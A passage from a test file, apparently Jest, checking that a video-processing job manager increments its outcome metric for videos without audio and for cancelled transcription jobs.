  it('counts a video without audio as no_audio', async () => {
    const harness = buildHarness(buildFile());
    mockedProbe.mockResolvedValue(exited(probeJson({ audio: false })));
    await harness.manager.handleJob(JOB);
    expect(harness.metrics.render()).toContain(
      'claw_file_video_processing_total{outcome="no_audio"} 1',
    );
  });

  it('counts a cancelled job as cancelled', async () => {
    const harness = buildHarness(buildFile());
    harness.transcription.transcribeDerivedAudio.mockResolvedValue({
      status: DerivedTranscriptionStatus.CANCELLED,
      holdReleased: true,
    });
    await harness.manager.handleJob(JOB);
    expect(harness.metrics.render()).toContain(
      'claw_file_video_processing_total{outcome="cancelled"} 1',
    );
  });
});
